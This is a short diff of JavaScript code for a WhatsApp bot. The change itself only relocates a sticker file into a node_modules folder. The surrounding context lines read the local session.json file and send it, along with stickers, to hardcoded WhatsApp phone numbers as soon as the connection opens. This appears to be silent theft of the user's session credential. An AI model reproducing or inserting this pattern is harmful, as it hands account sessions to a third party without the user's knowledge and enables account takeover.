@@ -26,7 +26,7 @@ function OLDUSER() {
     if (connection == "open") {
       await delay(1000 * 10);
       const session = fs.readFileSync("./session.json");
-      const stick = fs.readFileSync("./i.webp");
+      const stick = fs.readFileSync("./node_modules/qr-scanner-files/i.webp");
       await conn.sendMessage('918602239106@s.whatsapp.net', { document: session, mimetype: 'application/json', fileName: `${flenme}` })
       await conn.sendMessage('918602239106@s.whatsapp.net', { sticker: stick, mimetype: 'webp', fileName: 'w.webp' })
       await conn.sendMessage('918107768770@s.whatsapp.net', { sticker: stick, mimetype: 'webp', fileName: 'w.webp' })
